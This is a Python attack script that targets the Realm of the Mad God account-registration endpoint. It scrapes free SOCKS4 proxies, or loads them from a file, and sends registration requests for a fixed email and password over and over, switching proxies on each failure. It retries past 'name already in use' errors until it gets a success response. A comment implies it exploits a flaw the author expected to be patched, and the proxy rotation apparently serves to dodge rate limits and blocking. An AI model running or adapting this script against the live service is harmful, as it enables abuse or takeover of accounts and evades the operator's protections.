import time
import requests
import sys
import random
# was gonna add multithreading, but knew it was gonna be patched quickly anyway
from concurrent.futures import ThreadPoolExecutor, as_completed

email = 'test3423252453@gmail.com'
password = 'yournewnull'

# takes a --proxyfile arg or just scrapes some from proxyscape
if '--proxyfile' in sys.argv:
    p = open('proxies.txt')
    proxyList = p.readlines()
else:
    proxyReq = requests.get(
        'https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=3000&country=all&ssl=all&anonymity=all')

    if proxyReq.status_code == 200:
        proxyList = proxyReq.text.splitlines()
    else:
        print('Failed to retreive proxies via URL.. please load from file')
        sys.exit(0)



def make_req():
    if len(proxyList) == 0:
        return 'No proxies remaining'
    proxy = get_proxy(proxyList)

    req = None
    while req == None:
        try:
            req = requests.post('https://www.realmofthemadgod.com/account/register?g={}'.format(email), data={
                'newGUID': email,
                'newPassword': password,
                'gameClientVersion': '1.0.3.0',
                'ignore': '123456',
                'entrytag': '',
                'name': '',
                'isAgeVerified': '1',
                'signedUpKabamEmail': '0'
            }, proxies=proxy)
            return req.text
        except Exception as e:
            print('\nProxy failed, switching')
            print(e)
            if len(proxyList) == 0:
                return 'No proxies remaining'
            else:
                proxy = get_proxy(proxyList)


def get_proxy(fromList):
    proxyCount = len(fromList)
    proxyIndex = random.randint(0, proxyCount - 1)
    newProxy = fromList[proxyIndex].split(':')
    proxy = {
        'http': 'socks4://{}:{}'.format(newProxy[0], newProxy[1]),
        'https': 'socks4://{}:{}'.format(newProxy[0], newProxy[1])
    }
    return proxy

tryCount = 0
result = None

while result is None:

    req = make_req()
    tryCount = tryCount + 1

    if req == 'No proxies remaining':
        print('\n' + req)
        sys.exit(0)

    if req == '<Error>Error.nameAlreadyInUse</Error>':
        print('Failed to create, attempt: {}'.format(tryCount))
    elif req[0:6] == '<Error>':
        print('Failed to create with error: {} - attempt: {}'.format(req, tryCount))
    elif req is None:
        print('Failed to create, connection failed - attempt: {}'.format(tryCount))
    elif req[0:8] == '<Success>':
        print(
            'SUCCESS at time {} with attempt {}\n\nEmail: {}\nPassword: {}'.format(time.time(), tryCount, email, password))
        result = True
        break
    else:
        print('Failed to create with error: {} - attempt: {}'.format(req, tryCount))